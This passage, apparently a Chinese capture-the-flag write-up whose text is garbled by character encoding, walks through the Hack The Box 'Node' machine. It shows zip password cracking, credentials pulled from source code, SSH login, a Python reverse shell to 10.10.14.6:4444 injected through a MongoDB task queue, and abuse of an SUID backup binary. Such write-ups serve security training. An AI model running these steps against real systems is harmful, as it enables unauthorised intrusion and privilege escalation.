\n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# file unknow \nunknow: Zip archive data, at least v1.0 to extract, compression method=store\n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# mv unknow myplace.zip\n```\næ˜¯ä¸€ä¸ª zip ç±»å‹çš„ï¼Œé‚£å°±å°è¯•è§£å‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# unzip myplace.zip\nArchive:  myplace.zip\n   creating: var/www/myplace/\n[myplace.zip] var/www/myplace/package-lock.json password:\n```\néœ€è¦ä¸€ä¸ªè§£å‹å¯†ç \n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# fcrackzip -D -p /usr/share/wordlists/rockyou.txt  myplace.zip\npossible pw found: magicword\n```\nè§£å‹å¯†ç å‡ºæ¥äº†ï¼Œå»è§£å‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop/var/www/myplace]\nâ””â”€# ls -la\næ€»ç”¨é‡ 56\ndrwxr-xr-x  4 root root  4096  9æœˆ  3  2017 .\ndrwxr-xr-x  3 root root  4096  7æœˆ 12 20:24 ..\n-rw-rw-r--  1 root root  3861  9æœˆ  2  2017 app.html\n-rw-rw-r--  1 root root  8058  9æœˆ  3  2017 app.js\ndrwxr-xr-x 69 root root  4096  9æœˆ  2  2017 node_modules\n-rw-rw-r--  1 root root   283  9æœˆ  2  2017 package.json\n-rw-r--r--  1 root root 21264  9æœˆ  2  2017 package-lock.json\ndrwxrwxr-x  6 root root  4096  9æœˆ  2  2017 static\n```\næœ‰ä¸€äº›æ–‡ä»¶ï¼Œåˆ°å¤„çœ‹çœ‹æœ‰æ²¡æœ‰æœ‰ç”¨çš„ä¸œè¥¿å§\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop/var/www/myplace]\nâ””â”€# grep -Ri password .\n```\nä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤è¿›è¡Œç­›é€‰ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ª mongodb\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop/var/www/myplace]\nâ””â”€# cat app.js\n\nconst express     = require('express');\nconst session     = require('express-session');\nconst bodyParser  = require('body-parser');\nconst crypto      = require('crypto');\nconst MongoClient = require('mongodb').MongoClient;\nconst ObjectID    = require('mongodb').ObjectID;\nconst path        = require(\"path\");\nconst spawn        = require('child_process').spawn;\nconst app         = express();\nconst url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';\nconst backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';\n```\næŸ¥çœ‹ app.js å…¶ä¸­å’Œ mangodb æœ‰å…³çš„åªæœ‰ const url è¿™ä¸€å¥\n\næ‰€ä»¥æˆ‘ä»¬åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = mark\npassword = 5AYRft73VtFpc84k\n```\nç›®å‰åªæœ‰ 22 å’Œ 3000 ç«¯å£æ‰“å¼€ï¼Œ3000 ç«¯å£æˆ‘ä»¬å·²ç»æ˜¯ admin æƒé™äº†ï¼Œè‡ªç„¶ä¸å¯èƒ½ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ 22 ç«¯å£\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ssh mark@10.10.10.58                       \nThe authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.\nED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.58' (ED25519) to the list of known hosts.\nmark@10.10.10.58's password: \n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\n.-. \n        .-'``(|||) \n     ,`\\ \\    `-`.                 88                         88 \n    /   \\ '``-.   `                88                         88 \n  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 \n (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 \n  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 \n    \\   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 \n     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' \n        `-..-(   ) \n              `-` \n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nLast login: Wed Sep 27 02:33:14 2017 from 10.10.14.3\nmark@node:~$ whoami&&id\nmark\nuid=1001(mark) gid=1001(mark) groups=1001(mark)\n```\næˆåŠŸæ‹¿åˆ° user æƒé™\n\nè¿›æ¥ååœ¨ç”¨æˆ·ç›®å½•ä¸‹æ²¡æœ‰çœ‹åˆ° flag æ–‡ä»¶\n\n/home/tom/user.txt é€šè¿‡ find æŸ¥æ‰¾ï¼Œåœ¨ tom ç›®å½•ä¸‹æ‰¾åˆ°äº† flag æ–‡ä»¶\n\n```bash\nmark@node:/home/tom$ cat user.txt \ncat: user.txt: Permission denied\n```\nä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰æƒé™\n\n# æƒé™æå‡\n## Tom\n```bash\nmark@node:/home$ ps aux | grep tom\ntom       1231  0.0  8.6 1033968 65472 ?       Ssl  02:21   0:22 /usr/bin/node /var/www/myplace/app.js\ntom       1238  0.0  5.7 1008568 43220 ?       Ssl  02:21   0:07 /usr/bin/node /var/scheduler/app.js\nmark     16416  0.0  0.1  14228   932 pts/0    S+   13:43   0:00 grep --color=auto tom\n```\næŸ¥çœ‹ä¸€ä¸‹ Tom è¿è¡Œçš„æ–‡ä»¶\n\n```bash\nmark@node:/home$ cat /var/scheduler/app.js\nconst exec        = require('child_process').exec;\nconst MongoClient = require('mongodb').MongoClient;\nconst ObjectID    = require('mongodb').ObjectID;\nconst url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';\n\nMongoClient.connect(url, function(error, db) {\n  if (error || !db) {\n    console.log('[!] Failed to connect to mongodb');\n    return;\n  }\n\n  setInterval(function () {\n    db.collection('tasks').find().toArray(function (error, docs) {\n      if (!error && docs) {\n        docs.forEach(function (doc) {\n          if (doc) {\n            console.log('Executing task ' + doc._id + '...');\n            exec(doc.cmd);\n            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });\n          }\n        });\n      }\n      else if (error) {\n        console.log('Something went wrong: ' + error);\n      }\n    });\n  }, 30000);\n\n});\n```\nå¯ä»¥çœ‹åˆ° /var/scheduler/app.js è¿æ¥äº†åä¸º scheduler çš„ mongodb æ•°æ®åº“ï¼Œåœ¨åä¸º tasks çš„é›†åˆä¸­æœç´¢æ–‡æ¡£å¹¶æ‰§è¡Œ â€˜cmdâ€™ å­—æ®µ\n\nè®©æˆ‘ä»¬è¿æ¥åˆ° mongodb å¹¶åœ¨ä»»åŠ¡é›†åˆä¸­æ’å…¥ä¸€ä¸ªæ–°æ–‡æ¡£ã€‚æˆ‘ä»¬å¸Œæœ›ç”¨æˆ· tom æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨â€œcmdâ€å­—æ®µä¸­ã€‚\n\n```bash\nmark@node:~$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k\nMongoDB shell version: 3.2.16\n```\n```bash\ndb.tasks.insert({\"cmd\":\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.6\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"sh\\\")'\"});\n```\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 41470\n$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")';\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")';\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\ntom@node:/$ whoami&&id\nwhoami&&id\ntom\nuid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)\n```\næˆåŠŸææƒåˆ° Tom\n\n```bash\ntom@node:~$ pwd\npwd\n/home/tom\ntom@node:~$ ls   \nls\nuser.txt\ntom@node:~$ cat user.txt\ncat user.txt\ne1156acc3574e04b06908ecf76be91b1\n```\næˆåŠŸè·å–åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\n```bash\nfind / -type f -perm -4000 2>/dev/null\n```\næ£€æŸ¥ä¸€æ³¢ suid ä¿¡æ¯ æ˜¾ç¤º tom å…·æœ‰çš„æƒé™\n\n```bash\ntom@node:/$ find / -type f -perm -4000 2>/dev/null\nfind / -type f -perm -4000 2>/dev/null\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/local/bin/backup\n/usr/bin/chfn\n/usr/bin/at\n/usr/bin/gpasswd\n/usr/bin/newgidmap\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/newuidmap\n/bin/ping\n/bin/umount\n/bin/fusermount\n/bin/ping6\n/bin/ntfs-3g\n/bin/su\n/bin/mount\n```\nçœ‹èµ·æ¥æœ€å¼‚å¸¸çš„å°±æ˜¯ /usr/local/bin/backup äº†\n\n```bash\ntom@node:/$ file /usr/local/bin/backup\nfile /usr/local/bin/backup\n/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped\n```\næŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æ ¼å¼å¯ä»¥ç¡®å®šæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶\n\næ£€æŸ¥ä¸€ä¸‹æ–‡ä»¶ /var/www/myplace/app.js\n\n```bash\n                    'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~\"\"??9VWQQQQQQQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQQQP\\'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\"?9$QQQQQQQQQQQQQQ',\n          'QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ',\n          'QQQQQQQQQQW\\' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ',\n          'QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ',\n          'QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ',\n          'QQQQQQQP\\'.yQQQQQQQQQQQP\"       <wa,.!4WQQQQQQQWdWP??!\"??4WWQQQWQQc ?QWQQQQQ',\n          'QQQQQP\\'_a.<aamQQQW!<yF \"!` ..  \"??$Qa \"WQQQWTVP\\'    \"??\\' =QQmWWV?46/ ?QQQQQ',\n          'QQQP\\'sdyWQP?!`.-\"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ',\n          'QQ[ j@mQP\\'adQQP4ga, -????\" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?\"`  -?QzQ7L ]QQQ',\n          'QW jQkQ@ jWQQD\\'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc \"4QQQQa   .QP4QQQQfWkl jQQQ',\n          'QE ]QkQk $D?`  waa \"?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`\"QQQD\\Qf(.QWQQ',\n          'QQ,-Qm4Q/-QmQ6 \"WWQma/  \"??QQQQQQL 4W\"- -?$QQQQWP`s,awT$QQQ@  \"QW@?$:.yQQQQ',\n          'QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\\'<mWWWWWQW?^  ` ]6QQ\\' yQQQQQ',\n          'QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  \"????9VWaamQWV???\"  a j/  ]QQf jQQQQQQ',\n          'QQQQQQw,\"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ',\n          'QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ',\n          'QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ',\n          'QQQQQQQQQQ,\"$WQQWQQQQg,.\"?QQQQ\\'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ',\n          'QQQQQQQQQWQa ?$WQQWQQQQQa,.\"?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ',\n          'QQQQQQQQQQWWma \"9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ',\n          'QQQQQQQQQQQQQQQws \"Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ',\n          'QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ',\n          'QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQQQQWWQQga,-\"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ',\n          'QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW',\n          'QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ',\n          'QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^\"!???????!^`_saQWWQQQQQQQ',\n          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ',\n          'QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ',\n```\nçœ‹åˆ°ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œåº”è¯¥è¿˜æœ‰å…¶ä»–çš„ä¸œè¥¿\n\n```bash\nconst backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';\n```\næ‹¿åˆ°äº†ä¸€ä¸ª key\n\n```bash\napp.get('/api/admin/backup', function (req, res) {\n    if (req.session.user && req.session.user.is_admin) {\n      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);\n      var backup = '';\n```\nbackup çš„è¿è¡Œæ ¼å¼æ˜¯ backup -q key æ–‡ä»¶ç›®å½•ï¼Œç„¶åå°±ä¼šæŠŠæˆ‘ä»¬æŒ‡å®šçš„ç›®å½•ç»™æ‰“åŒ…ä¸ºå‹ç¼©æ–‡ä»¶\n\nè¿˜è®°å¾—æˆ‘ä»¬åœ¨ app.js ä¸­æ‰¾åˆ°çš„å¯†é’¥ 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 å—ï¼Ÿæ´¾ä¸Šç”¨åœºäº†\n\n```bash\ntom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root\n<ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root         \n [+] Finished! Encoded backup is below:\n\nUEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==\n```\n```bash\nUEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==\n```\nå¾—åˆ°äº†ä¸€ä¸² base64 ç ï¼Œè¿›è¡ŒæŸ¥çœ‹å¹¶è§£å‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# base64 -d base > base_encode \n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# file base_encode \nbase_encode: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted\n```\nç¡®å®æ˜¯ä¼šè¢«å‹ç¼©ä¸º zip æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# unzip base_encode \nArchive:  base_encode\n   skipping: root.txt                need PK compat. v5.1 (can do v4.6)\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# cat root.txt     \nQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~\"\"??9VWQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\"?9$QQQQQQQQQQQQQQ\nQQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ\nQQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ\nQQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ\nQQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ\nQQQQQQQP'.yQQQQQQQQQQQP\"       <wa,.!4WQQQQQQQWdWP??!\"??4WWQQQWQQc ?QWQQQQQ\nQQQQQP'_a.<aamQQQW!<yF \"!` ..  \"??$Qa \"WQQQWTVP'    \"??' =QQmWWV?46/ ?QQQQQ\nQQQP'sdyWQP?!`.-\"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ\nQQ[ j@mQP'adQQP4ga, -????\" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?\"`  -?QzQ7L ]QQQ\nQW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc \"4QQQQa   .QP4QQQQfWkl jQQQ\nQE ]QkQk $D?`  waa \"?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`\"QQQD\\Qf(.QWQQ\nQQ,-Qm4Q/-QmQ6 \"WWQma/  \"??QQQQQQL 4W\"- -?$QQQQWP`s,awT$QQQ@  \"QW@?$:.yQQQQ\nQQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ\nQQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  \"????9VWaamQWV???\"  a j/  ]QQf jQQQQQQ\nQQQQQQw,\"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ\nQQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ\nQQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ\nQQQQQQQQQQ,\"$WQQWQQQQg,.\"?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ\nQQQQQQQQQWQa ?$WQQWQQQQQa,.\"?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ\nQQQQQQQQQQWWma \"9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ\nQQQQQQQQQQQQQQQws \"Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ\nQQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ\nQQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ\nQQQQQQQQQQQQQQQQQQQQQQWWQQga,-\"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ\nQQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW\nQQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ\nQQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^\"!???????!^`_saQWWQQQQQQQ\nQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ\nQQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ\n```\nä½¿ç”¨è§£å‹å¯†ç  magicword è¿›è¡ŒæŸ¥çœ‹åï¼Œå¾—åˆ°äº†åˆšæ‰æˆ‘ä»¬å‘ç°äº†æœ‰è¶£çš„ç¬‘è„¸ï¼ŒæŸ¥çœ‹ä»£ç 